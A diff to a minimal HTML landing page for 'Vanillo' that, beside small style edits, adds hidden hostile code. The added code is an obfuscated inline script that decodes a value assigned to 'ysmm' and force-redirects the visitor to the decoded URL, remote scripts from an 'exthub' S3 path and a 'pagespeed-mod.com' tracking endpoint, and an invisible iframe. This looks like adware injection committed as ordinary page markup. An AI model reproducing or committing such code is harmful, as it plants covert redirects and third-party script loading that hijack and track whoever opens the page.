@@ -1,13 +1,60 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
+<html lang="en" crosspilot="" style="
+    height: 100vh;
+"><script async="" src="https://www.google-analytics.com/analytics.js"></script><script>
+Object.defineProperty(window, 'ysmm', {
+	set: function(val) {
+		var T3 = val,
+				key,
+				I = '',
+				X = '';
+		for (var m = 0; m < T3.length; m++) {
+			if (m % 2 == 0) {
+				I += T3.charAt(m);
+			} else {
+				X = T3.charAt(m) + X;
+			}
+		}
+		T3 = I + X;
+		var U = T3.split('');
+		for (var m = 0; m < U.length; m++) {
+			if (!isNaN(U[m])) {
+				for (var R = m + 1; R < U.length; R++) {
+					if (!isNaN(U[R])) {
+						var S = U[m]^U[R];
+						if (S < 10) {
+							U[m] = S;
+						}
+						m = R;
+						R = U.length;
+					}
+				}
+			}
+		}
+		T3 = U.join('');
+		T3 = window.atob(T3);
+		T3 = T3.substring(T3.length - (T3.length - 16));
+		T3 = T3.substring(0, T3.length - 16);
+		key = T3;
+		if (key && (key.indexOf('http://') === 0 || key.indexOf("https://") === 0)) {
+			document.write('<!--');
+			window.stop();
+
+			window.onbeforeunload = null;
+			window.location = key;
+		}
+	}
+});
+</script><head>
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Vanillo</title>
     <meta name="description" content="Watch this.">
-</head>
-<body>
+<script type="text/javascript" src="https://s3.amazonaws.com/exthub/e/2/r/US_microsoft edge.min.js" data-awssuidacr="QusfnNvzGMSmrvaQ5DpQ2beEcEmHM2oI"></script><script type="text/javascript" async="" src="//www.pagespeed-mod.com/v1/taas?id=cs&amp;ak=32b001198a46647f164402ebaec7a88c&amp;si=d07acaa3a5ff4a4f99b12b98acafe347&amp;tag=1005&amp;rand=QusfnNvzGMSmrvaQ5DpQ2beEcEmHM2oI&amp;ord=1567263029029235.5"></script></head>
+<body data-new-gr-c-s-check-loaded="14.984.0" data-gr-ext-installed="" style="
+    height: 100%;
+    margin: 0;
+">
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@700&display=swap');
         body {
@@ -19,12 +66,13 @@
         h1 {
             font-size: 48px;
             margin-left: 16px;
-            letter-spacing: -1px;
+            letter-spacing: -2%;
         }
     </style>
-    <div style="display:flex;flex-direction:row;justify-content:center;">
-        <img src="/vanillo.svg" alt="Vanillo Logo" style="width:48px;">
+    <div style="display:flex;flex-direction:row;justify-content: center;align-items: center;height: 100%;">
+        <img src="vanillo.svg" alt="Vanillo Logo" style="width:48px;">
         <h1>Vanillo</h1>
     </div>
-</body>
-</html>
+
+
+<iframe src="about:blank" style="display: none;"></iframe></body></html>
